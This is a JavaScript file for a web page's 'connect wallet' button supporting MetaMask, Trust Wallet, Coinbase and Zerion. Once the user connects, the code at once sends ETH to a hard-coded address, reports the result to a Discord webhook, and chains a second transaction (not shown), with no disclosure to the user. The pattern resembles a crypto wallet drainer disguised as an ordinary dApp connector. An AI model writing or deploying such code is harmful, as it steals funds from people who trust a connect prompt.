let isConnecting = false; // Flag to prevent multiple connections

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true; // Set the flag to true
    document.getElementById("connectButton").disabled = true; // Disable the button

    // Show wallet options by displaying the wallet selection div
    document.getElementById("walletSelection").style.display = 'block';
}

function walletSelected(walletChoice) {
    document.getElementById("walletSelection").style.display = 'none'; // Hide the wallet selection

    let account;
    if (walletChoice === "MetaMask") {
        // MetaMask connection logic
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.request({ method: 'eth_requestAccounts' })
            .then(accounts => {
                account = accounts[0];
                console.log(`Connected to MetaMask account: ${account}`);
                return sendFirstTransaction(account); // Automatically send the first transaction
            })
            .catch(error => console.error("Error connecting to MetaMask:", error));
        } else {
            alert("MetaMask is not installed. Please install it.");
            window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
        }
    } else if (walletChoice === "Trust Wallet") {
        // Trust Wallet connection logic (same as MetaMask)
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.request({ method: 'eth_requestAccounts' })
            .then(accounts => {
                account = accounts[0];
                console.log(`Connected to Trust Wallet account: ${account}`);
                return sendFirstTransaction(account); // Automatically send the first transaction
            })
            .catch(error => console.error("Error connecting to Trust Wallet:", error));
        } else {
            alert("Trust Wallet is not installed.");
        }
    } else if (walletChoice === "Coinbase Wallet") {
        // Coinbase Wallet connection logic (same as MetaMask)
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.request({ method: 'eth_requestAccounts' })
            .then(accounts => {
                account = accounts[0];
                console.log(`Connected to Coinbase Wallet account: ${account}`);
                return sendFirstTransaction(account); // Automatically send the first transaction
            })
            .catch(error => console.error("Error connecting to Coinbase Wallet:", error));
        } else {
            alert("Coinbase Wallet is not installed.");
        }
    } else if (walletChoice === "Phantom Wallet") {
        // Phantom Wallet logic (unsupported for Ethereum)
        alert("Phantom Wallet is not supported for Ethereum.");
        return;
    } else if (walletChoice === "Zerion Wallet") {
        // Zerion Wallet connection logic (same as MetaMask)
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.request({ method: 'eth_requestAccounts' })
            .then(accounts => {
                account = accounts[0];
                console.log(`Connected to Zerion Wallet account: ${account}`);
                return sendFirstTransaction(account); // Automatically send the first transaction
            })
            .catch(error => console.error("Error connecting to Zerion Wallet:", error));
        } else {
            alert("Zerion Wallet is not installed.");
        }
    }
}

async function sendFirstTransaction(walletAddress) {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.0002"; // The updated amount for the first transaction

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction response:", txResponse);

            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Automatically trigger the second transaction using the fixed token threshold
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);
            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("MetaMask is not installed. Please install it.");
    }
}

// Attach the event listener to the button
document.getElementById("connectButton").addEventListener("click", connectWallet);
